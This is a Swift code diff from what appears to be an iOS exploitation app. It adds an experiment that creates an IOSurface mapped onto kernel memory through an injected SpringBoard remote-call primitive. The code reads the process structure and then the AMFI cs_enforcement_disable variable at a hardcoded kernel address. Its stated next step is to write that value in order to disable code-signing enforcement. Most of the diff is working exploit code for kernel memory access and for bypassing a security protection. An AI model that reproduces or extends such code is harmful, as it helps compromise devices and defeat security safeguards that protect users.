@@ -465,6 +465,14 @@ struct AMFIExperimentView: View {
             let exp51 = self.expIOSurfaceAMFIAccess()
             experimentResults.append(exp51)
             
+            // ============================================
+            // 🔥🔥🔥🔥 Experiment 52: IOSurface with IOSurfaceAddress!
+            // Map kernel VA directly via IOSurfaceAddress property!
+            // darksword already uses this technique!
+            // ============================================
+            let exp52 = self.expIOSurfaceMapKernelAddr()
+            experimentResults.append(exp52)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -3134,6 +3142,114 @@ struct AMFIExperimentView: View {
         
         let success = detail.contains("✅ Surface memory R/W")
         return ExperimentResult(name: "🔥🔥🔥 IOSurface AMFI", success: success, detail: detail, timestamp: Date())
+    }
+    
+    /// 🔥🔥🔥🔥 THE KEY: Create IOSurface with IOSurfaceAddress = kernel VA!
+    /// darksword uses this exact technique (create_surface_with_address)
+    /// If we can map cs_enforcement_disable VA → read/write from userspace!
+    private func expIOSurfaceMapKernelAddr() -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "🔥🔥🔥🔥 IOSurface MAP", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        let mgr = dspmgr.shared
+        let mem = sb.trojanMem
+        var detail = "IOSurface with IOSurfaceAddress → map kernel memory!\n\n"
+        
+        // Target: cs_enforcement_disable at 0xfffffff00a3304e8 + slide
+        // But first test with a SAFE address (our own proc, which we know works)
+        let safeTarget = ds_get_our_proc() // known accessible kernel address
+        let amfiTarget = UInt64(0xfffffff00a3304e8) + mgr.kernslide
+        
+        detail += "Safe target (our proc): 0x\(String(format: "%llx", safeTarget))\n"
+        detail += "AMFI target: 0x\(String(format: "%llx", amfiTarget))\n\n"
+        
+        // Create NSDictionary with IOSurfaceAddress + IOSurfaceAllocSize
+        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
+        let nsNumClass = remote_getClass(sb, "NSNumber")
+        let numWithLong = remote_sel(sb, "numberWithUnsignedLongLong:")
+        let numWithInt = remote_sel(sb, "numberWithInteger:")
+        let dictNew = remote_sel(sb, "new")
+        let setObj = remote_sel(sb, "setObject:forKey:")
+        
+        // First: try with SAFE address (our proc) to verify technique works
+        let dict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        
+        // IOSurfaceAddress = safeTarget
+        let addrNum = remote_msg(sb, nsNumClass, numWithLong, safeTarget, 0, 0, 0)
+        remote_msg(sb, dict, setObj, addrNum, remote_NSString(sb, "IOSurfaceAddress"), 0, 0)
+        
+        // IOSurfaceAllocSize = 0x4000
+        let sizeNum = remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0)
+        remote_msg(sb, dict, setObj, sizeNum, remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        
+        // Create surface with address!
+        let surface = RootExecutor.rcall(sb, "IOSurfaceCreate", dict)
+        detail += "IOSurfaceCreate(addr=proc): 0x\(String(format: "%llx", surface))\n"
+        
+        if surface != 0 {
+            // Lock and get base
+            RootExecutor.rcall(sb, "IOSurfaceLock", surface, 0, 0)
+            let baseAddr = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", surface)
+            detail += "Base address: 0x\(String(format: "%llx", baseAddr))\n"
+            
+            if baseAddr != 0 {
+                // Read first 8 bytes — should be proc struct data!
+                var readBuf = [UInt8](repeating: 0, count: 8)
+                sb.remoteRead(baseAddr, to: &readBuf, size: 8)
+                let val = readBuf.withUnsafeBytes { $0.load(as: UInt64.self) }
+                detail += "Read from mapped memory: 0x\(String(format: "%016llx", val))\n"
+                
+                // Compare with what socket KRW reads at same address
+                let socketVal = ds_kread64(safeTarget)
+                detail += "Socket KRW reads same addr: 0x\(String(format: "%016llx", socketVal))\n"
+                
+                if val == socketVal && val != 0 {
+                    detail += "\n✅✅✅✅ VALUES MATCH! IOSurface MAPS KERNEL MEMORY! ✅✅✅✅\n"
+                    detail += "We can read kernel memory via IOSurface base address!\n\n"
+                    detail += "NOW: try mapping AMFI target address...\n"
+                    
+                    // NOW TRY WITH AMFI ADDRESS!
+                    // Create second surface with AMFI target
+                    let dict2 = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+                    let amfiNum = remote_msg(sb, nsNumClass, numWithLong, amfiTarget, 0, 0, 0)
+                    remote_msg(sb, dict2, setObj, amfiNum, remote_NSString(sb, "IOSurfaceAddress"), 0, 0)
+                    remote_msg(sb, dict2, setObj, sizeNum, remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+                    
+                    let surface2 = RootExecutor.rcall(sb, "IOSurfaceCreate", dict2)
+                    detail += "IOSurfaceCreate(addr=AMFI): 0x\(String(format: "%llx", surface2))\n"
+                    
+                    if surface2 != 0 {
+                        RootExecutor.rcall(sb, "IOSurfaceLock", surface2, 0, 0)
+                        let base2 = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", surface2)
+                        detail += "AMFI base: 0x\(String(format: "%llx", base2))\n"
+                        
+                        if base2 != 0 {
+                            var amfiBuf = [UInt8](repeating: 0, count: 4)
+                            sb.remoteRead(base2, to: &amfiBuf, size: 4)
+                            let amfiVal = amfiBuf.withUnsafeBytes { $0.load(as: UInt32.self) }
+                            detail += "cs_enforcement value: 0x\(String(format: "%x", amfiVal))\n"
+                            detail += "\n🎉🎉🎉🎉🎉 CAN READ AMFI VARIABLE! 🎉🎉🎉🎉🎉\n"
+                            detail += "NEXT: WRITE 1 TO DISABLE CS ENFORCEMENT!\n"
+                        }
+                        RootExecutor.rcall(sb, "IOSurfaceUnlock", surface2, 0, 0)
+                    } else {
+                        detail += "AMFI surface create failed (address might be rejected)\n"
+                    }
+                } else {
+                    detail += "\nValues don't match or zero — IOSurfaceAddress might not work as expected\n"
+                    detail += "val=0x\(String(format: "%llx", val)), socket=0x\(String(format: "%llx", socketVal))\n"
+                }
+            }
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", surface, 0, 0)
+        } else {
+            detail += "❌ IOSurfaceCreate with address failed\n"
+            detail += "IOSurfaceAddress property might not be supported from userspace\n"
+            detail += "(darksword uses it from KERNEL context during exploit)\n"
+        }
+        
+        let success = detail.contains("🎉🎉🎉")
+        return ExperimentResult(name: "🔥🔥🔥🔥 IOSurface MAP kernel", success: success, detail: detail, timestamp: Date())
     }
     
     /// IOSurface from SpringBoard — SB has IOSurface entitlement!
